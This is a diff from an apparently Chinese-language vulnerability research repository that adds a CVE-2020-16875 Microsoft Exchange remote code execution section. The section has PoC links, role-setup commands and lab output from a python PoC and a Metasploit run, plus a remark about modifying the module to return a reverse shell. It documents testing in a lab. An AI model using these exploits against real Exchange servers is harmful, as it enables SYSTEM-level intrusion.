@@ -17,7 +17,7 @@ ProxyLogon is Just the Tip of the Iceberg: A New Attack Surface on Microsoft Exc
 | CVE-2019-1019 (暂无域环境) | [CVE-2019-1019](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2019-1019) | Jun 11, 2019 | Microsoft Windows suffers from an HTTP to SMB NTLM reflection that leads to a privilege escalation. | yes |
 | CVE-2019-1040 (暂无域环境) | [CVE-2019-1040](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1040) | Jun 11, 2019 | Windows NTLM Tampering Vulnerability | yes |
 | CVE-2020-0688 (completed) | [CVE-2020-0688](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2020-0688) | Feb 11, 2020 | Microsoft Exchange Validation Key Remote Code Execution Vulnerability | yes |
-| CVE-2020-16875 | [CVE-2020-16875]() |  |  | yes |
+| CVE-2020-16875 (completed) | [CVE-2020-16875](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2020-16875) | Sep 8, 2020 | Microsoft Exchange Server DlpUtils AddTenantDlpPolicy Remote Code Execution | yes |
 | CVE-2020-17083 | [CVE-2020-17083]() |  |  | yes |
 | CVE-2020-17143 | [CVE-2020-17143]() |  |  | yes |
 | CVE-2020-17144 | [CVE-2020-17144]() |  |  | yes |
@@ -298,10 +298,85 @@ viewstate 的反序列化，成为第一个能直接在 exchange 服务器上执
 
 网上分析文章也多，还有很多开源的武器化实现，就不过多写了
 
-# CVE-2020-16875
+# CVE-2020-16875 (completed)
 ## CVE-2020-16875 part links
 
- - [Microsoft Exchange Server DlpUtils AddTenantDlpPolicy Remote Code Execution Vulnerability](https://srcincite.io/pocs/cve-2020-16875.py.txt)
+ - [Microsoft Exchange Server DlpUtils AddTenantDlpPolicy Remote Code Execution](https://packetstormsecurity.com/files/159210/Microsoft-Exchange-Server-DlpUtils-AddTenantDlpPolicy-Remote-Code-Execution.html)
+ - [CVE-2020-16875 python poc](https://srcincite.io/pocs/cve-2020-16875.py.txt)
+ - [CVE-2020-16875 powershell poc](https://srcincite.io/pocs/cve-2020-16875.ps1.txt)
+ - [CVE-2020-16875 Protection/Filter Bypass](https://raw.githubusercontent.com/x41sec/advisories/master/X41-2020-007/x41mas-2020-007-microsoft-exchange-rce.txt)
+ - [Microsoft Exchange Remote Code Execution - CVE-2020-16875](https://www.x41-dsec.de/security/advisory/exploit/research/2020/12/21/x41-microsoft-exchange-rce-dlp-bypass/)
+ - [CVE-2020-16875：Microsoft Exchange RCE复现](https://cloud.tencent.com/developer/article/1704777)
+ - [Exchange漏洞分析系列 CVE-2020-16875](https://www.anquanke.com/post/id/219091)
+ - [metasploit exchange_ecp_dlp_policy.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/exchange_ecp_dlp_policy.rb)
+ - [Making Clouds Rain :: Remote Code Execution in Microsoft Office 365](https://srcincite.io/blog/2021/01/12/making-clouds-rain-rce-in-office-365.html)
+
+ - 影响exchange版本: Exchange Server <= 2016 CU19 and 2019 CU8 (December 2020 updates)
+ - 原公开日期: 2020-09-08
+ - 最新补丁bypass发布日期: 2021-01-12
+
+此漏洞允许远程攻击者在受影响的Exchange Server上执行任意代码。利用此漏洞需要身份验证。此外，目标用户必须具有分配的"数据丢失防护"角色和活动邮箱。如果用户处于"合规管理"或更高级的"组织管理"角色组中，则他们具有"数据丢失预防"角色。由于安装Exchange的用户处于"组织管理"角色组中，因此他们过渡地具有"数据丢失预防"角色。具体的缺陷存在于New-DlpPolicy命令的处理过程中。这个问题是由于在创建DLP策略时缺乏对用户提供的模板数据的适当验证造成的。攻击者可以利用此漏洞以SYSTEM权限执行代码。
+
+ - 本地测试exchange环境
+
+| 测试状态 | exchange版本 | File Name | 出版日期 | File Size |
+| ----------- | ----------- | ----------- | ----------- | ----------- |
+| 测试成功 | Exchange Server 2016 累计更新 CU17(KB4556414) 15.01.2044.004 | ExchangeServer2016-x64-cu17.iso | 2020/6/12 | 6.6 GB |
+
+被攻击的exchange用户需要有"Data Loss Prevention"角色分配，如果通过ecp接口(此poc)执行攻击，则用户将需要一个可用的邮箱.
+
+``` bash
+New-RoleGroup -Name "dlp users" -Roles "Data Loss Prevention" -Members "harrym"
+```
+
+ - ![](./pics/cve-2020-16875.png)
+
+``` bash
+Get-RoleGroup "dlp users" | Format-List
+```
+
+ - ![](./pics/cve-2020-16875-1.png)
+
+1. python poc
+
+ - [cve-2020-16875.py](./CVE-2020-16875/cve-2020-16875.py)
+
+具体攻击请求流程在poc中写的很清楚，就不过多分析了，成功以system权限执行命令
+
+``` bash
+(base) D:\1.recent-research\exchange\proxy-attackchain\CVE-2020-16875>python cve-2020-16875.py 192.168.14.6 administrator@exchange2016.com:xxxxxx mspaint
+(+) logged in as administrator@exchange2016.com
+(+) found the __viewstate: /wEPDwUILTg5MDAzMDFkZPMgRmGb/6MPD4JaqGioF1vSUbmaOqIkWGNUIP6TVhRU
+(+) executed mspaint as SYSTEM!
+```
+
+ - ![](./pics/cve-2020-16875-2.png)
+
+ - ![](./pics/cve-2020-16875-3.png)
+
+2. powershell poc
+
+ - [cve-2020-16875.ps1](./CVE-2020-16875/cve-2020-16875.ps1)
+
+这个脚本使用Kerberos认证请求PowerShell端，要在域内使用
+
+3. metasploit exchange_ecp_dlp_policy 模块
+
+可以利用但是没有session返回，需要修改模块里的命令执行反弹shell功能
+
+``` bash
+msf6 exploit(windows/http/exchange_ecp_dlp_policy) > run
+
+[*] Started reverse TCP handler on 192.168.14.128:4444
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. Exchange Server 15.1.2044 is a vulnerable build.
+[*] Logging in to OWA with creds administrator:xxxxxx
+[+] Successfully logged in to OWA
+[*] Retrieving ViewState from DLP policy creation page
+[+] Successfully retrieved ViewState
+[*] Creating custom DLP policy from malicious template
+[*] Exploit completed, but no session was created.
+```
 
 # CVE-2020-17083
 ## CVE-2020-17083 part links
